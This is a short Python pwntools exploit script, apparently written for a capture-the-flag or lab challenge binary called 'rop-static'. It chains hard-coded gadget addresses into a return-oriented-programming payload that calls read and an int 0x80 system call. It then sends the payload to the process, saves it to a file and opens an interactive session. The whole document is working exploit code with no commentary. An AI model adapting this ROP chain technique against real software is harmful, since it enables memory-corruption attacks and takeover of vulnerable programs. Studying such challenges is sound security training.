from pwn import *
import time

pad = p32(0x8049330)
five = 0x8049021
read = p32(0x8048170)
four = p32(0x804901c)
eax = p32(0x08048106) #: mov eax, dword ptr [ebp - 8] ; add esp, 8 ; pop ebp ; ret
pop3= p32(0x0804815f) #add esp, 0x10 ; pop ebx ; pop ebp ; ret
pop2 = p32(0x080482ca)
ebx = p32(0x08048162)
int80 = p32(0x08048157)
printf = p32(0x80481d0)
p = process("./rop-static")
time.sleep(.08)
payload = p32(five + 8) *(212/4) + read + pop3 + p32(0) * 5 + p32(five+8) + eax + "AAAA" * 3 + ebx +  four * 2 + int80 + "AAAA" * 6 + read + pop3 + p32(3) + pad + p32(0x100) + p32(0x8048130)*4 + "BBBB" + p32(1) + pad + p32(0x100)
with open("x", 'w') as x:
    x.write(payload)
p.sendline(payload)
p.interactive()
